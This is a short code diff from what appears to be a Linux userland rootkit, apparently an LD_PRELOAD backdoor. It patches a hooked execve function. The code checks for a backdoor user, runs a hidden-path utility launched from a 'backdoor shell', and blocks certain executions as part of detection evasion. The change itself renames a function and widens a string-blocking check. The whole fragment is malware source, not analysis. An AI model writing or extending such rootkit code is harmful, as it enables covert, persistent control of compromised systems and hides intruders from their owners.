@@ -8,7 +8,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
     if(is_bdusr()){
 #ifdef HIDING_UTIL                                     /* running ./bdv from a backdoor shell  */
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))   /* allows you to hide & unhide paths on */
-            dohiding_util(argv);                       /* the fly.                             */
+            do_hidingutil(argv);                       /* the fly.                             */
 #endif
         return (long)call(CEXECVE, filename, argv, envp);
     }
@@ -35,8 +35,8 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
     }
 #endif
 
-#if defined(BLOCK_STRINGS) && defined(DO_EVASIONS)
-    if(block_strings(argv)){
+#ifdef DO_EVASIONS
+    if(block_strings(filename, argv)){
         errno = EPERM;
         return -1;
     }
